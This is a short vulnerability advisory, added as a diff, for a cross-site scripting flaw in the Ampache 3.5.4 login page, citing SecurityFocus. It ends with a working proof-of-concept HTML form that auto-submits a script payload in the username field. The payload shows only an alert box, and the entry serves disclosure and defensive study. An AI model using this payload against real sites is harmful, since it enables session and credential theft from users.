@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/47756/info
+
+Ampache is prone to a cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied data.
+
+An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
+
+Ampache 3.5.4 is vulnerable; other versions may also be affected.
+
+<html> <body onload="document.forms[0].submit()"> <form method="POST" action="http://localhost/ampache-3.5.4/login.php"> <input type="hidden" name="username" value=""><script>alert(0)</script>" /> </form> </body> </html> 
